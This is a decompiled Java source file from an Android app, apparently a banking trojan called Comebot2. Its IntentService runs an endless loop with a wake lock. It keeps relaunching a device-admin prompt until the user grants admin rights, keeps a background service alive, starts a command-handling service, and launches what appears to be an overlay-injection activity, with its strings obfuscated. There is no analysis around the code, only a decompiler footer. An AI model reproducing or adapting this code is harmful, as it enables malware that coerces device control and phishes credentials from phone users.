package anu_bispro.app;

import android.app.IntentService;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.PowerManager;
import java.util.concurrent.TimeUnit;

public class gowhile extends IntentService {
  a a = new a();
  
  d b = new d();
  
  Context c;
  
  public gowhile() {
    super(b.a("\\ILNRJ^"));
  }
  
  protected void onHandleIntent(Intent paramIntent) {
    this.c = (Context)this;
    PowerManager.WakeLock wakeLock = ((PowerManager)this.c.getSystemService(d.a("V\037Q\025T"))).newWakeLock(1, b.a("hCIPRE^"));
    if (wakeLock != null)
      wakeLock.acquire(); 
    a a1 = this.a;
    this.b.getClass();
    a.a((Context)this, "", 14000L);
    int i = 0;
    byte b = 0;
    char c = 'Ϩ';
    while (true) {
      char c1;
      try {
        TimeUnit.MILLISECONDS.sleep(c);
      } catch (InterruptedException interruptedException) {
        interruptedException.printStackTrace();
      } 
      if (!((DevicePolicyManager)getSystemService(d.a("B\025P\031E\025y\000I\034O\023_"))).isAdminActive(new ComponentName(this.c, DAR.class))) {
        c1 = '\n';
        Intent intent = new Intent((Context)this, admky.class);
        intent.addFlags(268435456);
        startActivity(intent);
      } else {
        if (!a(apiproc.class))
          this.c.startService(new Intent(this.c, apiproc.class)); 
        c1 = 'Ϩ';
      } 
      b++;
      int j = i + 1;
      this.b.getClass();
      byte b1 = b;
      if (b >= 14) {
        this.c.startService(new Intent(this.c, commands.class));
        b1 = 0;
      } 
      this.b.getClass();
      c = c1;
      b = b1;
      i = j;
      if (j >= 12) {
        if (this.a.f(this.c)) {
          String str = this.a.a(this.c, b.a("JTEPyRHQ"));
          try {
            if ((!str.equals(null) || !str.equals("")) && str.length() > 2) {
              Intent intent2 = new Intent();
              this((Context)this, actinj.class);
              Intent intent1 = intent2.putExtra(d.a("U\004T"), str);
              intent1.addFlags(268435456);
              intent1.addFlags(8388608);
              intent1.addFlags(1073741824);
              startActivity(intent1);
            } 
          } catch (Exception exception) {}
        } 
        i = 0;
        c = c1;
        b = b1;
      } 
    } 
  }
}


/* Location:              /home/fahim/Desktop/Comebot2-dex2jar.jar!/anu_bispro/app/gowhile.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */